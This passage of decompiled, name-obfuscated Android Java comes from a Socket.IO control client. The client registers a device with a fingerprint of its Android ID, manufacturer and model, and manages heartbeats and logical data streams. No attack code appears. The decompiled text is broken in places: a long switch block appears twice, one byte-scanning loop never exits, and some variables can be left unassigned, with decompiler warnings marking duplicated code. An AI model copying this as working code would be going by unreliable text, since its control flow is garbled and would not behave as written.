                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i7 = 0;
                                int i8 = 0;
                                bArr = null;
                                while (true) {
                                    if (i7 < length) {
                                        Object obj3 = objArr[i7];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i8++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i7++;
                                    } else if (i8 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
                                    String strOptString3 = jSONObjectL6.optString("reason", "");
                                    synchronized (d0VarF4.f1574g) {
                                        try {
                                            if (!d0VarF4.f1582p && !d0VarF4.f1581o) {
                                                d0VarF4.f1581o = true;
                                                if (strOptString3 != null && !strOptString3.isEmpty() && !"closed".equals(strOptString3) && !"eof".equals(strOptString3)) {
                                                    if (strOptString3.length() > 256) {
                                                        strOptString3 = strOptString3.substring(0, 256);
                                                    }
                                                    d0VarF4.f1583q = new IOException("remote logical stream closed: ".concat(strOptString3));
                                                }
                                                d0VarF4.f1574g.notifyAll();
                                            }
                                        } catch (Throwable th8) {
                                            throw th8;
                                        }
                                    }
                                }
                                e = null;
                            } catch (IOException e10) {
                                e = e10;
                                String strOptString4 = jSONObjectL6.optString("requestId", "");
                                if (!strOptString4.isEmpty() && (d0VarF2 = b1Var5.f(strOptString4)) != null) {
                                    d0VarF2.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var10.t();
                                return;
                            }
                            return;
                        case 10:
                            a0 a0Var11 = this;
                            if (a0Var11.f1528s.get() && a0Var11.N.get() == null && (jSONObjectL = a0.l(objArr)) != null) {
                                a0Var11.t();
                                h2.m mVarA = a0.A(jSONObjectL);
                                if (mVarA != null) {
                                    a0Var11.D(a0Var11.f1533x.get(), mVarA);
                                    return;
                                }
                                return;
                            }
                            return;
                        default:
                            a0 a0Var12 = this;
                            String strC = "";
                            Throwable th9 = null;
                            if (objArr != null) {
                                for (Object obj4 : objArr) {
                                    if (obj4 instanceof Throwable) {
                                        th9 = (Throwable) obj4;
                                    }
                                }
                            }
                            if (th9 == null) {
                                return;
                            }
                            String str8 = "websocket";
                            if (th9 instanceof y0.a) {
                                y0.a aVar2 = (y0.a) th9;
                                String strC2 = a0.c(aVar2.f6035c, 24);
                                str8 = strC2.isEmpty() ? "websocket" : strC2;
                                Object obj5 = aVar2.f6036d;
                                strC = a0.c(obj5 != null ? String.valueOf(obj5) : "", 64);
                            }
                            a0Var12.R.set(new z(str8, strC, th9));
                            return;
                    }
                }
            });
            final int i6 = 3;
            sVarA.c("connect_error", new x0.a() { // from class: g2.h
                /* JADX WARN: Code duplicated, block: B:371:0x0646  */
                /* JADX WARN: Code duplicated, block: B:373:0x064a  */
                /* JADX WARN: Code duplicated, block: B:378:0x06a7  */
                /* JADX WARN: Code duplicated, block: B:482:0x067f A[EXC_TOP_SPLITTER, SYNTHETIC] */
                @Override // x0.a
                public final void a(Object[] objArr) {
                    y.l lVar2;
                    Throwable th;
                    Throwable th2;
                    boolean z2;
                    long jMax;
                    h2.g gVarR;
                    g.j jVar2;
                    Throwable th3;
                    y.l lVar3;
                    byte[] bArr;
                    d0 d0VarF;
                    d0 d0VarF2;
                    JSONObject jSONObjectL;
                    switch (i6) {
                        case 0:
                            a0 a0Var = this;
                            String str2 = "";
                            if (a0Var.f1528s.get()) {
                                a0Var.f1532w.set(false);
                                d2.y yVarC = null;
                                a0Var.R.set(null);
                                t tVar = t.f1739i;
                                a0Var.f1516h.getClass();
                                a0Var.I(tVar, SystemClock.elapsedRealtime());
                                long jIncrementAndGet = a0Var.f1533x.incrementAndGet();
                                String strN = c2.u.n((Context) a0Var.f1510e.f1959a, "deviceId");
                                h2.b bVar = a0Var.f1510e;
                                Context context2 = a0Var.f1502a;
                                bVar.getClass();
                                y.r rVar = new y.r();
                                rVar.f6032a = "";
                                rVar.f6033b = "";
                                rVar.f6034c = "";
                                try {
                                    rVar.f6032a = Settings.Secure.getString(context2.getApplicationContext().getContentResolver(), "android_id");
                                } catch (Throwable unused2) {
                                    rVar.f6032a = "";
                                }
                                if (((String) rVar.f6032a) == null) {
                                    rVar.f6032a = "";
                                }
                                String str3 = Build.MANUFACTURER;
                                if (str3 == null) {
                                    str3 = "";
                                }
                                rVar.f6033b = str3;
                                String str4 = Build.MODEL;
                                if (str4 == null) {
                                    str4 = "";
                                }
                                rVar.f6034c = str4;
                                if (a0Var.T.f2035i && (lVar2 = a0Var.f1512f) != null) {
                                    try {
                                        yVarC = lVar2.c(strN, (String) a0Var.f1504b.f5973e, rVar);
                                    } catch (RuntimeException unused3) {
                                        Log.w("SocketControlClient", "control continuity attempt persistence failed");
                                    }
                                }
                                d2.y yVar = yVarC;
                                AtomicReference atomicReference = a0Var.P;
                                a0Var.f1516h.getClass();
                                atomicReference.set(new x(jIncrementAndGet, rVar, yVar, SystemClock.elapsedRealtime()));
                                String str5 = a0Var.f1506c;
                                String str6 = (String) a0Var.f1504b.f5973e;
                                h2.h hVar2 = a0Var.T;
                                try {
                                    JSONObject jSONObjectPut = new JSONObject().put("version", 1).put("deviceId", strN);
                                    JSONObject jSONObject = new JSONObject();
                                    String str7 = (String) rVar.f6032a;
                                    if (str7 == null) {
                                        str7 = "";
                                    }
                                    JSONObject jSONObjectPut2 = jSONObjectPut.put("fingerprint", jSONObject.put("androidId", str7).put("manufacturer", (String) rVar.f6033b).put("model", (String) rVar.f6034c));
                                    if (str5 != null) {
                                        str2 = str5;
                                    }
                                    JSONObject jSONObjectPut3 = jSONObjectPut2.put("model", str2).put("appVersion", str6).put("stableCoreBehaviorId", t9.f5181l).put("coreSourceSha256", t9.f5182m).put("buildProvenance", t9.n);
                                    if (hVar2 == null) {
                                        hVar2 = new h2.h();
                                    }
                                    JSONObject jSONObjectPut4 = jSONObjectPut3.put("capabilities", a0.d(hVar2));
                                    if (yVar != null) {
                                        jSONObjectPut4.put("controlResume", new JSONObject().put("credential", (String) yVar.f651a).put("attemptId", (String) yVar.f652b).put("priorSessionId", (String) yVar.f654d).put("priorGeneration", yVar.f653c));
                                    }
                                    StringBuilder sbJ = a0.a.j(jIncrementAndGet, "control registration starting attempt=", " resumeProofPresent=");
                                    sbJ.append(yVar != null);
                                    Log.i("SocketControlClient", sbJ.toString());
                                    try {
                                        a0Var.f1514g.a("device:register", jSONObjectPut4, new k(a0Var, jIncrementAndGet, 0));
                                        return;
                                    } catch (RuntimeException unused4) {
                                        Log.w("SocketControlClient", "device registration emit failed");
                                        return;
                                    }
                                } catch (JSONException e3) {
                                    throw new IllegalStateException(e3);
                                }
                                break;
                            }
                            return;
                        case 1:
                            a0 a0Var2 = this;
                            w0.a aVarK = a0.k(objArr);
                            h2.e eVar = (h2.e) a0Var2.N.get();
                            if (!a0Var2.f1528s.get() || eVar == null || !a0Var2.T.n) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "unsupported"));
                                    return;
                                }
                                return;
                            }
                            try {
                                h2.j jVarY = a0.y(a0.l(objArr), eVar);
                                try {
                                    g.j jVar3 = a0Var2.f1508d;
                                    boolean z3 = jVar3 != null && jVar3.g(jVarY);
                                    a0Var2.t();
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(z3, z3 ? jVarY : null, z3 ? "" : "stale"));
                                        return;
                                    }
                                    return;
                                } catch (RuntimeException unused5) {
                                    if (aVarK != null) {
                                        aVarK.a(a0.u(false, jVarY, "callback_failed"));
                                        return;
                                    }
                                    return;
                                }
                            } catch (IOException unused6) {
                                if (aVarK != null) {
                                    aVarK.a(a0.u(false, null, "invalid"));
                                    return;
                                }
                                return;
                            }
                        case 2:
                            a0 a0Var3 = this;
                            if (a0Var3.f1528s.get()) {
                                boolean z4 = true;
                                boolean z5 = !a0Var3.W && a0Var3.N.get() == null;
                                long j3 = a0Var3.f1533x.get();
                                if (!z5) {
                                    a0Var3.f1533x.incrementAndGet();
                                }
                                String strValueOf = (objArr == null || objArr.length <= 0) ? "socket disconnected" : String.valueOf(objArr[0]);
                                IOException iOException = new IOException("socket.io disconnected: ".concat(strValueOf));
                                z zVar = (z) a0Var3.R.getAndSet(null);
                                b bVar2 = (b) ((AtomicReference) a0Var3.f1520j.f5973e).get();
                                if (zVar == null && bVar2.f1543d == null) {
                                    z4 = false;
                                }
                                a0Var3.f1516h.getClass();
                                boolean z6 = z4;
                                long jElapsedRealtime = SystemClock.elapsedRealtime();
                                int i7 = z6 ? 5 : 4;
                                if (zVar == null) {
                                    if (bVar2 == null || (th2 = bVar2.f1543d) == null) {
                                        th = iOException;
                                    }
                                    z2 = z5;
                                    if (a0Var3.V <= 0) {
                                        jMax = -1;
                                    } else {
                                        jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                    }
                                    gVarR = a0Var3.R(h2.g.l(i7, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                    a0Var3.U = gVarR;
                                    a0Var3.f(iOException);
                                    a0Var3.I(t.f1734d, jElapsedRealtime);
                                    Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                    if (z2) {
                                        a0Var3.F(strValueOf, iOException, gVarR);
                                        return;
                                    }
                                    try {
                                        j jVar7 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                        a0Var3.f1516h.getClass();
                                        a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar7), 250L, TimeUnit.MILLISECONDS);
                                        return;
                                    } catch (RejectedExecutionException unused7) {
                                        return;
                                    }
                                }
                                th2 = zVar.f1830a;
                                th = th2;
                                z2 = z5;
                                if (a0Var3.V <= 0) {
                                    jMax = -1;
                                } else {
                                    jMax = Math.max(0L, jElapsedRealtime - a0Var3.V);
                                }
                                gVarR = a0Var3.R(h2.g.l(i7, th, jMax, a0Var3.p()), jElapsedRealtime, zVar, bVar2);
                                a0Var3.U = gVarR;
                                a0Var3.f(iOException);
                                a0Var3.I(t.f1734d, jElapsedRealtime);
                                Log.w("SocketControlClient", "control transport disconnected ".concat(a0Var3.U.e()));
                                if (z2) {
                                    a0Var3.F(strValueOf, iOException, gVarR);
                                    return;
                                }
                                j jVar8 = new j(a0Var3, j3, strValueOf, iOException, gVarR, 0);
                                a0Var3.f1516h.getClass();
                                a0Var3.f1526q.schedule(new m(a0Var3, "registration_rejection_drain", 250 + SystemClock.elapsedRealtime(), jVar8), 250L, TimeUnit.MILLISECONDS);
                                return;
                            }
                            return;
                        case 3:
                            a0 a0Var4 = this;
                            if (a0Var4.f1528s.get()) {
                                Throwable th4 = null;
                                if (objArr != null) {
                                    for (Object obj : objArr) {
                                        if (obj instanceof Throwable) {
                                            th4 = (Throwable) obj;
                                        }
                                    }
                                }
                                z zVar2 = (z) a0Var4.R.get();
                                b bVar3 = (b) ((AtomicReference) a0Var4.f1520j.f5973e).get();
                                if (th4 == null && zVar2 != null) {
                                    th4 = zVar2.f1830a;
                                }
                                if (th4 == null && (th3 = bVar3.f1543d) != null) {
                                    th4 = th3;
                                }
                                Throwable th5 = zVar2 == null ? th4 : zVar2.f1830a;
                                IOException iOException2 = th4 instanceof IOException ? (IOException) th4 : new IOException("socket.io connect error".concat(th4 == null ? "" : ": ".concat(th4.getClass().getSimpleName())), th4);
                                a0Var4.f1516h.getClass();
                                long jElapsedRealtime2 = SystemClock.elapsedRealtime();
                                a0Var4.U = a0Var4.R(h2.g.l(5, th5 == null ? iOException2 : th5, a0Var4.V <= 0 ? -1L : Math.max(0L, jElapsedRealtime2 - a0Var4.V), a0Var4.p()), jElapsedRealtime2, zVar2, bVar3);
                                Log.w("SocketControlClient", "control connect error ".concat(a0Var4.U.e()));
                                if (!a0Var4.f1532w.compareAndSet(false, true) || (jVar2 = a0Var4.f1508d) == null) {
                                    return;
                                }
                                ((cf) jVar2.f1415d).f3702f.execute(new qe(jVar2, jVar2.f1413b, (AtomicReference) jVar2.f1414c, iOException2, a0Var4.U, 1));
                                return;
                            }
                            return;
                        case 4:
                            a0 a0Var5 = this;
                            a0Var5.v(a0Var5.f1533x.get(), objArr);
                            return;
                        case 5:
                            a0 a0Var6 = this;
                            JSONObject jSONObjectL2 = a0.l(objArr);
                            h2.e eVar2 = (h2.e) a0Var6.N.get();
                            if (jSONObjectL2 == null || eVar2 == null || !a0.q(jSONObjectL2, eVar2.f1982d)) {
                                return;
                            }
                            a0Var6.t();
                            a0Var6.C(jSONObjectL2, eVar2);
                            long jO = a0.o(jSONObjectL2);
                            a0Var6.f1516h.getClass();
                            long jElapsedRealtime3 = SystemClock.elapsedRealtime();
                            JSONObject jSONObjectN = a0.n(eVar2.f1982d, jO, jElapsedRealtime3);
                            w0.a aVarK2 = a0.k(objArr);
                            if (aVarK2 != null) {
                                aVarK2.a(jSONObjectN);
                            }
                            a0Var6.j("heartbeat:ack", jSONObjectN, jO, jElapsedRealtime3);
                            a0Var6.m();
                            return;
                        case 6:
                            a0 a0Var7 = this;
                            JSONObject jSONObjectL3 = a0.l(objArr);
                            h2.e eVar3 = (h2.e) a0Var7.N.get();
                            if (jSONObjectL3 == null || eVar3 == null || !a0.q(jSONObjectL3, eVar3.f1982d)) {
                                return;
                            }
                            long jO2 = a0.o(jSONObjectL3);
                            long j4 = a0Var7.G.get();
                            long j5 = a0Var7.H.get();
                            if (jO2 <= 0 || (jO2 <= j4 && jO2 > j5)) {
                                a0Var7.f1516h.getClass();
                                long jElapsedRealtime4 = SystemClock.elapsedRealtime();
                                a0Var7.D.set(jElapsedRealtime4);
                                a0Var7.s(jElapsedRealtime4, jO2, (jO2 <= 0 || jO2 != j4) ? -1L : a0Var7.F.get());
                                a0Var7.C(jSONObjectL3, eVar3);
                                a0Var7.m();
                                return;
                            }
                            long jIncrementAndGet2 = a0Var7.B.incrementAndGet();
                            StringBuilder sbJ2 = a0.a.j(jO2, "invalid Socket.IO heartbeat ACK event=heartbeat:ack sequence=", " lastSentSequence=");
                            sbJ2.append(j4);
                            j4.d(sbJ2, " lastAckSequence=", j5, " count=");
                            sbJ2.append(jIncrementAndGet2);
                            Log.w("SocketControlClient", sbJ2.toString());
                            return;
                        case 7:
                            a0 a0Var8 = this;
                            b1 b1Var = (b1) a0Var8.Q.get();
                            JSONObject jSONObjectL4 = a0.l(objArr);
                            w0.a aVarK3 = a0.k(objArr);
                            long jOptLong = 0;
                            if (b1Var == null || jSONObjectL4 == null) {
                                if (aVarK3 != null) {
                                    String strOptString = "";
                                    try {
                                        JSONObject jSONObjectPut5 = new JSONObject().put("version", 1);
                                        if (jSONObjectL4 != null) {
                                            strOptString = jSONObjectL4.optString("requestId", "");
                                        }
                                        JSONObject jSONObjectPut6 = jSONObjectPut5.put("requestId", strOptString);
                                        if (jSONObjectL4 != null) {
                                            jOptLong = jSONObjectL4.optLong("generation", 0L);
                                        }
                                        aVarK3.a(jSONObjectPut6.put("generation", jOptLong).put("ok", false).put("error", new JSONObject().put("code", "session_closed").put("message", "logical stream unavailable")));
                                        return;
                                    } catch (JSONException e4) {
                                        throw new IllegalStateException(e4);
                                    }
                                }
                                return;
                            }
                            Object obj2 = null;
                            try {
                                a1 a1VarH = b1Var.h(jSONObjectL4, true);
                                if (b1.e(a1VarH.f1537b)) {
                                    synchronized (b1Var.f1545a) {
                                        try {
                                            if (b1Var.f1550f) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "session_closed", "control session is closed"), obj2);
                                            } else if (b1Var.f1546b.size() >= 128) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "stream_limit", "logical stream limit reached"), obj2);
                                            } else if (b1Var.f1546b.containsKey((String) a1VarH.f1538c)) {
                                                lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "duplicate_request", "logical stream requestId already exists"), obj2);
                                            } else {
                                                d0 d0Var = new d0(b1Var, (String) a1VarH.f1538c, a1VarH.f1537b, a1VarH.f1536a);
                                                b1Var.f1546b.put((String) a1VarH.f1538c, d0Var);
                                                JSONObject jSONObjectG = b1.g((String) a1VarH.f1538c, a1VarH.f1536a);
                                                try {
                                                    jSONObjectG.put("ok", true);
                                                    lVar3 = new y.l(jSONObjectG, d0Var);
                                                } catch (JSONException e5) {
                                                    throw new IllegalStateException(e5);
                                                }
                                            }
                                        } catch (Throwable th6) {
                                            throw th6;
                                        }
                                    }
                                } else {
                                    lVar3 = new y.l(b1.i(a1VarH.f1536a, (String) a1VarH.f1538c, "unsupported_channel", "unsupported logical stream channel"), obj2);
                                }
                            } catch (IOException e6) {
                                lVar3 = new y.l(b1.i(jSONObjectL4.optLong("generation", 0L), jSONObjectL4.optString("requestId", ""), "invalid_stream_open", e6.getMessage()), obj2);
                            }
                            if (aVarK3 == null) {
                                d0 d0Var2 = (d0) lVar3.f5992d;
                                if (d0Var2 != null) {
                                    d0Var2.d(new IOException("stream:open ACK callback missing"), true);
                                    return;
                                }
                                return;
                            }
                            try {
                                aVarK3.a((JSONObject) lVar3.f5991c);
                                if (((d0) lVar3.f5992d) == null) {
                                    return;
                                }
                                a0Var8.t();
                                try {
                                    a0Var8.f1527r.execute(new e2.q0(a0Var8, b1Var, lVar3, 1));
                                    return;
                                } catch (RejectedExecutionException e7) {
                                    ((d0) lVar3.f5992d).d(new IOException("logical stream dispatcher stopped", e7), true);
                                    return;
                                }
                            } catch (RuntimeException e8) {
                                d0 d0Var3 = (d0) lVar3.f5992d;
                                if (d0Var3 != null) {
                                    d0Var3.d(new IOException("stream:open ACK failed", e8), true);
                                    return;
                                }
                                return;
                            }
                            break;
                        case 8:
                            a0 a0Var9 = this;
                            b1 b1Var2 = (b1) a0Var9.Q.get();
                            JSONObject jSONObjectL5 = a0.l(objArr);
                            if (b1Var2 == null || jSONObjectL5 == null) {
                                return;
                            }
                            IOException iOException3 = null;
                            if (objArr == null) {
                                bArr = null;
                            } else {
                                int length = objArr.length;
                                int i8 = 0;
                                int i9 = 0;
                                bArr = null;
                                while (true) {
                                    if (i8 < length) {
                                        Object obj3 = objArr[i8];
                                        if ((obj3 instanceof JSONObject) || (obj3 instanceof Map)) {
                                            i9++;
                                        } else if (obj3 instanceof byte[]) {
                                            if (bArr == null) {
                                                bArr = (byte[]) obj3;
                                            }
                                        } else if (!(obj3 instanceof w0.a)) {
                                        }
                                        i8++;
                                    } else if (i9 != 1) {
                                    }
                                    bArr = null;
                                }
                            }
                            try {
                                a1 a1VarH2 = b1Var2.h(jSONObjectL5, false);
                                d0 d0VarF3 = b1Var2.f((String) a1VarH2.f1538c);
                                if (d0VarF3 == null) {
                                    b1Var2.b(a1VarH2.f1536a, (String) a1VarH2.f1538c, "unknown_stream");
                                    e = new IOException("unknown logical stream");
                                } else {
                                    if (bArr == null || !q2.c.s(bArr.length)) {
                                        iOException3 = new IOException("logical stream payload exceeds 32 MiB");
                                    } else {
                                        int length2 = bArr.length;
                                        AtomicLong atomicLong = d0VarF3.f1570c.f1547c;
                                        if (length2 < 0 || length2 > 33554432) {
                                            iOException3 = new IOException("logical stream control buffer full");
                                        } else {
                                            while (true) {
                                                long j6 = atomicLong.get();
                                                long j7 = length2;
                                                if (j7 > 67108864 - j6) {
                                                    iOException3 = new IOException("logical stream control buffer full");
                                                } else if (atomicLong.compareAndSet(j6, j7 + j6)) {
                                                    byte[] bArr2 = (byte[]) bArr.clone();
                                                    synchronized (d0VarF3.f1574g) {
                                                        try {
                                                            if (d0VarF3.f1582p || d0VarF3.f1581o) {
                                                                b1 b1Var3 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var3.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var3.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream closed");
                                                            } else if (d0VarF3.f1576i.size() >= 32 || length2 > 33554432 - d0VarF3.n) {
                                                                b1 b1Var4 = d0VarF3.f1570c;
                                                                if (length2 > 0) {
                                                                    b1Var4.f1547c.addAndGet(-length2);
                                                                } else {
                                                                    b1Var4.getClass();
                                                                }
                                                                iOException3 = new IOException("logical stream inbound queue full");
                                                            } else {
                                                                d0VarF3.f1576i.addLast(bArr2);
                                                                d0VarF3.n += length2;
                                                                d0VarF3.f1574g.notifyAll();
                                                            }
                                                        } catch (Throwable th7) {
                                                            throw th7;
                                                        }
                                                    }
                                                }
                                            }
                                        }
                                    }
                                    if (iOException3 != null) {
                                        d0VarF3.d(iOException3, true);
                                    }
                                    e = iOException3;
                                }
                            } catch (IOException e9) {
                                e = e9;
                                String strOptString2 = jSONObjectL5.optString("requestId", "");
                                if (!strOptString2.isEmpty() && (d0VarF = b1Var2.f(strOptString2)) != null) {
                                    d0VarF.d(e, true);
                                }
                            }
                            if (e == null) {
                                a0Var9.t();
                                return;
                            }
                            return;
                        case 9:
                            a0 a0Var10 = this;
                            b1 b1Var5 = (b1) a0Var10.Q.get();
                            JSONObject jSONObjectL6 = a0.l(objArr);
                            if (b1Var5 == null || jSONObjectL6 == null) {
                                return;
                            }
                            try {
                                d0 d0VarF4 = b1Var5.f((String) b1Var5.h(jSONObjectL6, false).f1538c);
                                if (d0VarF4 != null) {
